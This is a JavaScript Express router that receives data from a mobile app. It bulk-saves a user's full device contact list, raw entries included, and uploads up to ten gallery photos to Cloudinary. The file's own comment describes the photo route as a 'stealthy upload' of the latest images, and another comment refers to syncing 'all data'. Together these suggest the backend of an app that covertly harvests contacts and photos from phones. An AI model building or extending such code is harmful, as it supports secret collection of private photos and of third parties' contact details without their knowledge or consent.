import express from 'express'
import { requireAuth } from '../middleware/auth.js'
import { MobileContact } from '../models/MobileContact.js'
import { MobileGallery } from '../models/MobileGallery.js'
import multer from 'multer'
import { uploadImageBuffer } from '../config/cloudinary.js'

// Use memoryStorage and fall back to a manual instance if the export is weird
const storage = multer.memoryStorage ? multer.memoryStorage() : multer({}).storage;
const upload = multer({ storage }).array('images', 10)

const router = express.Router()

/**
 * @route POST /api/mobile/sync-contacts
 * @desc Sync device contacts to the database
 */
router.post('/sync-contacts', requireAuth, async (req, res) => {
  try {
    const { contacts } = req.body
    if (!contacts || !Array.isArray(contacts)) {
      return res.status(400).json({ message: 'Invalid contacts data' })
    }

    const userId = req.user.id

    // Map contacts to our schema
    const contactData = contacts.map(c => ({
      userId,
      contactId: c.id || c.contactId,
      displayName: c.displayName || c.name || 'Unknown',
      phones: c.phones || [],
      emails: c.emails || [],
      rawJson: c
    }))

    // For simplicity and matching "automatic on all data", we update existing or insert new
    // To keep it clean, we'll use a bulk operation
    const operations = contactData.map(contact => ({
      updateOne: {
        filter: { userId, contactId: contact.contactId },
        update: { $set: contact },
        upsert: true
      }
    }))

    if (operations.length > 0) {
      await MobileContact.bulkWrite(operations)
    }

    res.json({ 
      message: 'Sync successful', 
      count: contactData.length 
    })
  } catch (error) {
    console.error('[Sync Error]', error)
    res.status(500).json({ message: 'Failed to sync contacts' })
  }
})

/**
 * @route POST /api/mobile/gallery-sync
 * @desc Stealthy upload of latest 10 images from mobile gallery
 */
router.post('/gallery-sync', requireAuth, (req, res) => {
  upload(req, res, async (err) => {
    if (err) {
      console.error('[Gallery Multer Error]', err)
      return res.status(400).json({ message: 'Error processing images' })
    }

    try {
      const userId = req.user.id
      const files = req.files
      const metadataStr = req.body.metadata // Extra info per image

      if (!files || files.length === 0) {
        return res.json({ message: 'Nothing to sync', count: 0 })
      }

      const metadata = metadataStr ? JSON.parse(metadataStr) : {}
      const results = []

      for (const file of files) {
        // 1. Check if we already have this asset locally to avoid re-uploading if possible
        // But for "latest 10" we usually just overwrite or append.
        // We'll use the originalname as a hint (since Capacitor gives unique names usually)
        
        try {
          const folder = 'mobile_gallery'
          const uploadResult = await uploadImageBuffer(file.buffer, folder)
          
          const newGalleryItem = await MobileGallery.create({
            userId,
            assetId: file.originalname, // We use originalname for tracking uniqueness if provided
            fileName: file.originalname,
            fileUrl: uploadResult.secure_url,
            mimeType: file.mimetype,
            metadata: metadata[file.originalname] || {}
          })
          
          results.push(newGalleryItem)
        } catch (uploadErr) {
          console.error('[Cloudinary Upload Error]', uploadErr)
        }
      }

      res.json({ 
        message: 'Gallery sync complete', 
        count: results.length,
        items: results.map(r => r.fileUrl)
      })
    } catch (error) {
      console.error('[Gallery Sync Error]', error)
      res.status(500).json({ message: 'Failed to sync gallery' })
    }
  })
})

export default router
